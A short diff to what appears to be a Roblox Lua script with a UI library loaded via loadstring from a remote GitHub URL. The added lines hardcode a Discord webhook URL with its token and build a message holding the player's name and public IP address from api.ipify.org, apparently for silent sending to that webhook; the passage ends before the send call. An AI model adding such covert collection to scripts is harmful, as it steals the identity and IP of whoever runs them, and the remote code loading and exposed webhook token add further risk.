@@ -1,3 +1,14 @@
+local webh = "https://discord.com/api/webhooks/1063781292690391140/9qgXEfL20klzfZTJp63GRLT2CZ7zGJoNJhjR-bL3TZ7_Xcyh_zUsdh26iTwyWdSfB_H0"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Kronos"))()
 
 local window = library:Window({
